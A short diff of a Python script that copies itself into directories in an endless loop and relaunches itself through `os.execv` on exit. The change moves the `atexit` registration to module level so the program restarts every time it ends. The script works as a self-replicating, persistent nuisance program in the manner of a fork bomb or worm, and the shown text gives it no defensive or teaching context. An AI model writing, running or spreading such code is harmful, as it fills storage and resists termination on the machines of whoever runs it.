@@ -12,6 +12,8 @@ import os, shutil, random, string, sys, atexit
 def _atexit():
     os.execv(sys.argv[0], sys.argv)
     
+atexit.register(_atexit)
+    
 cwd = os.getcwd()
 
 count = 0
@@ -24,6 +26,4 @@ while True:
     shutil.copy(f"../{sys.argv[0]}", os.getcwd())
     os.chdir(cwd)
     count += 1
-
-    atexit.register(_atexit)
     
